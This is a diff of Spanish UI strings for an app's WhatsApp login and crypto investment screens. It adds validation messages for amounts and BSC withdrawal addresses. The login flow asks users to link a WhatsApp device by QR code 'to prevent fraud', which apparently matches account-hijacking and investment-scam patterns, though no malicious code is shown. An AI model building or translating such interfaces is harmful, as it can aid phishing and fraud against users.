@@ -2,7 +2,7 @@ import { Translations } from './types'
 
 export const es: Translations = {
   whatsapp: {
-    title: 'Ingresa tu número de teléfono',
+    title: 'Usar WhatsApp para iniciar sesión',
     countryRegion: 'País/Región',
     telephoneNumber: 'Número de teléfono',
     authNotice: 'Por favor autentica tu identidad para identificar números sospechosos y prevenir fraudes',
@@ -11,7 +11,7 @@ export const es: Translations = {
     selectCountry: 'Seleccionar país',
     nextButton: 'Siguiente',
     sendingButton: 'Enviando...',
-    qrTitle: 'Usar WhatsApp Web',
+    qrTitle: 'Usar WhatsApp para iniciar sesión',
     qrStep1: 'Abre WhatsApp en tu teléfono',
     qrStep2: 'Toca <strong>Menú</strong> o <strong>Configuración</strong> y selecciona <strong>Dispositivos vinculados</strong>',
     qrStep3: 'Toca <strong>Vincular un dispositivo</strong>',
@@ -63,7 +63,7 @@ export const es: Translations = {
     date: 'Fecha',
     principal: 'Principal',
     profit: 'Beneficio',
-    redemptionProgress: 'Progreso de reembolso',
+    redemptionProgress: 'Progreso',
     noDataAvailable: 'No hay datos disponibles',
     addAssets: 'Agregar activos',
     enterAmountToAdd: 'Ingrese el monto a agregar',
@@ -77,6 +77,18 @@ export const es: Translations = {
     withdrawalAmount: 'Monto de retiro',
     enterWithdrawalAmount: 'Ingrese el monto de retiro',
     withdrawalAccount: 'Cuenta de retiro',
-    loginSuccess: '¡Inicio de sesión exitoso!'
+    loginSuccess: '¡Inicio de sesión exitoso!',
+    loginNoticeTitle: 'Por favor inicie sesión primero',
+    loginNoticeMessage: 'Por favor inicie sesión antes de realizar esta acción',
+    loginNoticeButton: 'Ir a iniciar sesión',
+    validationAmountRequired: 'Por favor ingrese el monto',
+    validationDaysRequired: 'Por favor seleccione los días',
+    validationAmountInvalid: 'El monto debe estar entre 1 y 1000',
+    validationWithdrawAmountRequired: 'Por favor ingrese el monto de retiro',
+    validationWithdrawAddressRequired: 'Por favor ingrese la cuenta de retiro',
+    validationWithdrawAmountInvalid: 'El monto de retiro debe ser mayor que 0',
+    validationWithdrawAddressInvalid: 'Por favor ingrese una dirección de red BSC válida (comienza con 0x, 42 caracteres)',
+    validationWithdrawDaysRequired: 'Por favor espere al menos 15 días antes de solicitar un retiro',
+    processing: 'Procesando...'
   }
 }
